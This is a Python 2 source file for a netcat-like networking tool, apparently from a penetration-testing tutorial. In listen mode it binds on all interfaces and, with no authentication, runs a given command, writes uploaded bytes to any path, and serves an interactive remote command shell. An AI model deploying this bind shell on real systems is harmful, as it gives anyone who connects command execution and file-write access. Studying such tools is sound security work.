import sys
import socket
import argparse
import threading
import subprocess

# global variables
listen = False
command = False
execute = ""
target = ""
upload_destination = ""
port = 0


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", help="target host")
    parser.add_argument("-p", "--port", help="target port", type=int)
    parser.add_argument("-l", "--listen", help="listen on [host]:[port] for incoming connections", action="store_true")
    parser.add_argument("-e", "--execute", help="execute the given file upon receiving a connection")
    parser.add_argument("-c", "--command", help="initialize a new command shell", action=
    "store_true")
    parser.add_argument("-u", "--upload_destination", help="upon receiving connection upload a file and write to [destination]")

    # read commandline options
    args = parser.parse_args()

    listen = args.listen
    port = args.port
    execute = args.execute
    command = args.command
    upload_destination = args.upload_destination
    target = args.target


    # are we going to listen or just send data from stdin?
    if not listen and target and port > 0:
        # read in buffer from commandline
        # this will block, so send CTRL-D if not sending
        # input to stdin
        buffer = sys.stdin.read()

        # send data
        client_sender(buffer)

    # we are going to listen and potentially
    # upload things, execute commands and drop a shell back
    # depending on our command line options above
    if listen:
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to target host
        client.connect((target, port))

        if buffer:
            client.send(buffer)

        while True:
            # wait for data
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print response,

            # wait for more input
            buffer = raw_input("")
            buffer += "\n"

            # send it
            client.send(buffer)
    except Exception:
        print "[*] Exception! Exiting."

        # tear down connection
        client.close()

def server_loop():
    global target

    # if no target, listen on all interfaces
    if not target:
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    # trim newline
    command = command.rstrip()

    # run the command and the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # send output back to client
    return output

def client_handler(client_socket):
    global upload_destination
    global execute
    global command

    # check for upload
    if upload_destination:
        # read in all bytes and send to destination
        file_buffer = ""

        # keep reading data until none available
        recv_len = 1
        while recv_len:
            data = client_socket.recv(1024)
            recv_len = len(data)
            file_buffer += data

            if recv_len < 1024:
                break

        # take these bytes and write them
        try:
            with open(upload_destination, "wb") as file_descriptor:
                file_descriptor.write(file_buffer)

            client_socket.send("Successfully saved file to %s\r\n"%upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n"%upload_destination)
    
    # check for command execution
    if execute:
        # run command
        output = run_command(execute)

        client_socket.send(output)

    # go into another loop if command shell requested
    if command:
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ")

            # receive until linefeed
            cmd_buffer = ""

            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # send back command output
            response = run_command(cmd_buffer)

            # send back response
            client_socket.send(response)

main()
